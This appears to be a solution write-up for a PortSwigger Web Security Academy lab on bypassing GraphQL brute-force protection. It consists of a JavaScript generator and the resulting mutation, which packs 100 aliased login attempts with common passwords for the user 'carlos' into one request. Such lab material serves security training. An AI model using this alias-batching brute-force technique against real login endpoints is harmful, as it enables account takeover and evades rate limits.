# Lab

https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

## Solution

```js
let passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"];

let query = "mutation { %aliases }"
let alias_template = "bruteforce%index:login(input:{password: \"%password\", username: \"carlos\"}) { success } "

let aliases = []

passwords.forEach((password, i) => aliases.push(alias_template.replace("%index", i).replace("%password", password)))
    
console.log(query.replace("%aliases", aliases.toString()))
```

```qraphql
mutation {
  bruteforce0: login(input: { password: "123456", username: "carlos" }) {
    success
  }
  bruteforce1: login(input: { password: "password", username: "carlos" }) {
    success
  }
  bruteforce2: login(input: { password: "12345678", username: "carlos" }) {
    success
  }
  bruteforce3: login(input: { password: "qwerty", username: "carlos" }) {
    success
  }
  bruteforce4: login(input: { password: "123456789", username: "carlos" }) {
    success
  }
  bruteforce5: login(input: { password: "12345", username: "carlos" }) {
    success
  }
  bruteforce6: login(input: { password: "1234", username: "carlos" }) {
    success
  }
  bruteforce7: login(input: { password: "111111", username: "carlos" }) {
    success
  }
  bruteforce8: login(input: { password: "1234567", username: "carlos" }) {
    success
  }
  bruteforce9: login(input: { password: "dragon", username: "carlos" }) {
    success
  }
  bruteforce10: login(input: { password: "123123", username: "carlos" }) {
    success
  }
  bruteforce11: login(input: { password: "baseball", username: "carlos" }) {
    success
  }
  bruteforce12: login(input: { password: "abc123", username: "carlos" }) {
    success
  }
  bruteforce13: login(input: { password: "football", username: "carlos" }) {
    success
  }
  bruteforce14: login(input: { password: "monkey", username: "carlos" }) {
    success
  }
  bruteforce15: login(input: { password: "letmein", username: "carlos" }) {
    success
  }
  bruteforce16: login(input: { password: "shadow", username: "carlos" }) {
    success
  }
  bruteforce17: login(input: { password: "master", username: "carlos" }) {
    success
  }
  bruteforce18: login(input: { password: "666666", username: "carlos" }) {
    success
  }
  bruteforce19: login(input: { password: "qwertyuiop", username: "carlos" }) {
    success
  }
  bruteforce20: login(input: { password: "123321", username: "carlos" }) {
    success
  }
  bruteforce21: login(input: { password: "mustang", username: "carlos" }) {
    success
  }
  bruteforce22: login(input: { password: "1234567890", username: "carlos" }) {
    success
  }
  bruteforce23: login(input: { password: "michael", username: "carlos" }) {
    success
  }
  bruteforce24: login(input: { password: "654321", username: "carlos" }) {
    success
  }
  bruteforce25: login(input: { password: "superman", username: "carlos" }) {
    success
  }
  bruteforce26: login(input: { password: "1qaz2wsx", username: "carlos" }) {
    success
  }
  bruteforce27: login(input: { password: "7777777", username: "carlos" }) {
    success
  }
  bruteforce28: login(input: { password: "121212", username: "carlos" }) {
    success
  }
  bruteforce29: login(input: { password: "000000", username: "carlos" }) {
    success
  }
  bruteforce30: login(input: { password: "qazwsx", username: "carlos" }) {
    success
  }
  bruteforce31: login(input: { password: "123qwe", username: "carlos" }) {
    success
  }
  bruteforce32: login(input: { password: "killer", username: "carlos" }) {
    success
  }
  bruteforce33: login(input: { password: "trustno1", username: "carlos" }) {
    success
  }
  bruteforce34: login(input: { password: "jordan", username: "carlos" }) {
    success
  }
  bruteforce35: login(input: { password: "jennifer", username: "carlos" }) {
    success
  }
  bruteforce36: login(input: { password: "zxcvbnm", username: "carlos" }) {
    success
  }
  bruteforce37: login(input: { password: "asdfgh", username: "carlos" }) {
    success
  }
  bruteforce38: login(input: { password: "hunter", username: "carlos" }) {
    success
  }
  bruteforce39: login(input: { password: "buster", username: "carlos" }) {
    success
  }
  bruteforce40: login(input: { password: "soccer", username: "carlos" }) {
    success
  }
  bruteforce41: login(input: { password: "harley", username: "carlos" }) {
    success
  }
  bruteforce42: login(input: { password: "batman", username: "carlos" }) {
    success
  }
  bruteforce43: login(input: { password: "andrew", username: "carlos" }) {
    success
  }
  bruteforce44: login(input: { password: "tigger", username: "carlos" }) {
    success
  }
  bruteforce45: login(input: { password: "sunshine", username: "carlos" }) {
    success
  }
  bruteforce46: login(input: { password: "iloveyou", username: "carlos" }) {
    success
  }
  bruteforce47: login(input: { password: "2000", username: "carlos" }) {
    success
  }
  bruteforce48: login(input: { password: "charlie", username: "carlos" }) {
    success
  }
  bruteforce49: login(input: { password: "robert", username: "carlos" }) {
    success
  }
  bruteforce50: login(input: { password: "thomas", username: "carlos" }) {
    success
  }
  bruteforce51: login(input: { password: "hockey", username: "carlos" }) {
    success
  }
  bruteforce52: login(input: { password: "ranger", username: "carlos" }) {
    success
  }
  bruteforce53: login(input: { password: "daniel", username: "carlos" }) {
    success
  }
  bruteforce54: login(input: { password: "starwars", username: "carlos" }) {
    success
  }
  bruteforce55: login(input: { password: "klaster", username: "carlos" }) {
    success
  }
  bruteforce56: login(input: { password: "112233", username: "carlos" }) {
    success
  }
  bruteforce57: login(input: { password: "george", username: "carlos" }) {
    success
  }
  bruteforce58: login(input: { password: "computer", username: "carlos" }) {
    success
  }
  bruteforce59: login(input: { password: "michelle", username: "carlos" }) {
    success
  }
  bruteforce60: login(input: { password: "jessica", username: "carlos" }) {
    success
  }
  bruteforce61: login(input: { password: "pepper", username: "carlos" }) {
    success
  }
  bruteforce62: login(input: { password: "1111", username: "carlos" }) {
    success
  }
  bruteforce63: login(input: { password: "zxcvbn", username: "carlos" }) {
    success
  }
  bruteforce64: login(input: { password: "555555", username: "carlos" }) {
    success
  }
  bruteforce65: login(input: { password: "11111111", username: "carlos" }) {
    success
  }
  bruteforce66: login(input: { password: "131313", username: "carlos" }) {
    success
  }
  bruteforce67: login(input: { password: "freedom", username: "carlos" }) {
    success
  }
  bruteforce68: login(input: { password: "777777", username: "carlos" }) {
    success
  }
  bruteforce69: login(input: { password: "pass", username: "carlos" }) {
    success
  }
  bruteforce70: login(input: { password: "maggie", username: "carlos" }) {
    success
  }
  bruteforce71: login(input: { password: "159753", username: "carlos" }) {
    success
  }
  bruteforce72: login(input: { password: "aaaaaa", username: "carlos" }) {
    success
  }
  bruteforce73: login(input: { password: "ginger", username: "carlos" }) {
    success
  }
  bruteforce74: login(input: { password: "princess", username: "carlos" }) {
    success
  }
  bruteforce75: login(input: { password: "joshua", username: "carlos" }) {
    success
  }
  bruteforce76: login(input: { password: "cheese", username: "carlos" }) {
    success
  }
  bruteforce77: login(input: { password: "amanda", username: "carlos" }) {
    success
  }
  bruteforce78: login(input: { password: "summer", username: "carlos" }) {
    success
  }
  bruteforce79: login(input: { password: "love", username: "carlos" }) {
    success
  }
  bruteforce80: login(input: { password: "ashley", username: "carlos" }) {
    success
  }
  bruteforce81: login(input: { password: "nicole", username: "carlos" }) {
    success
  }
  bruteforce82: login(input: { password: "chelsea", username: "carlos" }) {
    success
  }
  bruteforce83: login(input: { password: "biteme", username: "carlos" }) {
    success
  }
  bruteforce84: login(input: { password: "matthew", username: "carlos" }) {
    success
  }
  bruteforce85: login(input: { password: "access", username: "carlos" }) {
    success
  }
  bruteforce86: login(input: { password: "yankees", username: "carlos" }) {
    success
  }
  bruteforce87: login(input: { password: "987654321", username: "carlos" }) {
    success
  }
  bruteforce88: login(input: { password: "dallas", username: "carlos" }) {
    success
  }
  bruteforce89: login(input: { password: "austin", username: "carlos" }) {
    success
  }
  bruteforce90: login(input: { password: "thunder", username: "carlos" }) {
    success
  }
  bruteforce91: login(input: { password: "taylor", username: "carlos" }) {
    success
  }
  bruteforce92: login(input: { password: "matrix", username: "carlos" }) {
    success
  }
  bruteforce93: login(input: { password: "mobilemail", username: "carlos" }) {
    success
  }
  bruteforce94: login(input: { password: "mom", username: "carlos" }) {
    success
  }
  bruteforce95: login(input: { password: "monitor", username: "carlos" }) {
    success
  }
  bruteforce96: login(input: { password: "monitoring", username: "carlos" }) {
    success
  }
  bruteforce97: login(input: { password: "montana", username: "carlos" }) {
    success
  }
  bruteforce98: login(input: { password: "moon", username: "carlos" }) {
    success
  }
  bruteforce99: login(input: { password: "moscow", username: "carlos" }) {
    success
  }
}
```
